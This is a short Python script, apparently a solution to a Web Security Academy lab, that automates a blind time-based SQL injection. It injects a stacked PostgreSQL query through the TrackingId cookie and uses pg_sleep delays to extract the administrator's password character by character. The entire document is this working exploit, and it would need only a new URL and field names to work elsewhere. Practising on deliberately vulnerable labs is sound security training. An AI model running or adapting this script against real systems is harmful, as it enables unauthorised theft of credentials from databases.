import requests
import string
import time

URL = "https://ac251f461f24010ac0e80e4100080041.web-security-academy.net/"
BRUTE = string.ascii_lowercase + string.digits
print(BRUTE)
PASSWORD = ""
print("[INFO] : Starting")
for i in range(1,21):
    print(f"[INFO]: Character {i}")
    for j in BRUTE:
        cookies = {
            "TrackingId":f"xxxx'%3BSELECT CASE WHEN (SUBSTR((SELECT PASSWORD FROM USERS WHERE USERNAME = 'administrator'),{i},1) = '{j}') THEN pg_sleep(5) ELSE pg_sleep(0) END -- -",
            "session":"0j7eOeRYGjFIhLJABKI2Sj1HP5487S7f"
        }
        start = time.time()
        r = requests.get(url=URL, cookies=cookies)
        end = time.time()
        delay = end - start
        if delay > 5:
            print(f"[INFO]: Character {j} : Time delay: {delay}")
            # Delay more than 5s is the correct character
            PASSWORD += j
            break
print(f"[INFO]: DONE. Password is: {PASSWORD}")
